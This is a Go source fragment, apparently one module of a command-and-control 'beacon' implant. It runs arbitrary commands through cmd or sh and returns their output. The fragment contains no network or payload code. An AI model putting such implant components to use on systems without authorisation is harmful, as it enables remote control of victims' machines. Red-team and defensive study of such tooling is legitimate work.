// Shell Command module - Execute system commands

func (b *GoBeacon) executeCommand(command string) string {
	b.Logger.Printf("Executing command: %s", command)

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	var output bytes.Buffer
	var errorOutput bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &errorOutput

	err := cmd.Run()

	result := ""
	if output.Len() > 0 {
		result += fmt.Sprintf("STDOUT:\n%s\n", output.String())
	}
	if errorOutput.Len() > 0 {
		result += fmt.Sprintf("STDERR:\n%s\n", errorOutput.String())
	}
	if result == "" {
		if err != nil {
			result = fmt.Sprintf("Command failed: %v", err)
		} else {
			result = "Command executed successfully (no output)"
		}
	}

	return strings.TrimSpace(result)
}
